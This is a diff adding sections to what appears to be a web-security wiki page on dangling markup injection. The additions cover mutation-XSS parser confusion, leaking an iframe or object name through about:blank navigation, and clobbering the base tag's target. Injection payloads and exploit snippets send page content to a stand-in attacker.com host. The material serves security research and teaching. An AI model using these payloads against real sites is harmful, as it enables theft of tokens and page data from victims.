@@ -60,6 +60,14 @@ While this too works on Firefox, Chromium has a protection against this. There n
 
 <figure><img src="../../../.gitbook/assets/image (67).png" alt="" width="563"><figcaption><p>Chromium denying an implicitly closed <code>&#x3C;textarea></code></p></figcaption></figure>
 
+{% hint style="info" %}
+**Note**: in case your HTML is _parsed and serialized_ before being shown, it is hard to dangle half-open syntax. You may be able to exploit [#mutation-xss-and-dompurify](./#mutation-xss-and-dompurify "mention") to confuse the parser and make it think your input is inside a `<style>` tag (CSS). Their text content is seen as raw and isn't altered. In the browser, however, due to some namespace confusion or other mutation it is seen as regular HTML and the tag is dangled.
+
+```html
+<style><img src='https://attacker.com?
+```
+{% endhint %}
+
 ### Bypass newline detection
 
 Ideas taken from here:\
@@ -141,7 +149,55 @@ When you are able to create an iframe with a remote source, the `name=` attribut
 ```
 {% endcode %}
 
-This same attack works with `<object data=>` and `<embed src=>` tags too, which may have a more lax CSP.
+This same attack works with `<object data=>` and `<embed src=>` tags too, which may have a more allowing CSP.
+
+If the CSP doesn't allow any attacker's sources, but the page is iframable, we can take a trick from the [#nested-iframe](postmessage-exploitation.md#nested-iframe "mention") postMessage exploits by using `about:blank` and hijacking the iframe to read its name. This works because the name property is preserved across navigations.
+
+{% embed url="https://portswigger.net/research/bypassing-csp-with-dangling-iframes" %}
+Article explaining this trick of stealing the name with nested iframes
+{% endembed %}
+
+{% code title="Injection" %}
+```html
+<object data="about:blank" name='
+```
+{% endcode %}
+
+<pre class="language-html" data-title="Exploit"><code class="lang-html">&#x3C;iframe id="iframe" src="https://target.tld/dangling-object">&#x3C;/iframe>
+&#x3C;script>
+  iframe.onload = () => {
+    const object = iframe.contentWindow[0];
+    object.location = "about:blank";  // Navigate to our same-origin
+
+    const interval = setInterval(() => {
+      object.origin;  // When it becomes same-origin
+      clearInterval(interval);
+<strong>      alert(object.name);  // Leak its name (kept after navigation)
+</strong>    })
+  }
+&#x3C;/script>
+</code></pre>
+
+***
+
+Another related trick relies on the [`<base>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/base) tag and its `target=` attribute. By clobbering it, every link on the page that the user may click (including ones by the attacker) will get their name set to the attribute value. This also supports newlines still and allows you to leak just as before, without iframes but requiring a click on the attacker's link inside the target page. Using CSS or classes you may be able to cover the whole screen.
+
+{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}
+Article first explaining this technique with examples
+{% endembed %}
+
+{% code title="Injection" %}
+```html
+<a href="https://attacker.com/leak" style="position:fixed;top:0;left:0;width:100%;height:100%"></a>
+<base target='
+```
+{% endcode %}
+
+{% code title="https://attacker.com/leak" %}
+```javascript
+alert(window.name)  // Leak
+```
+{% endcode %}
 
 ### Leak via Referer
 
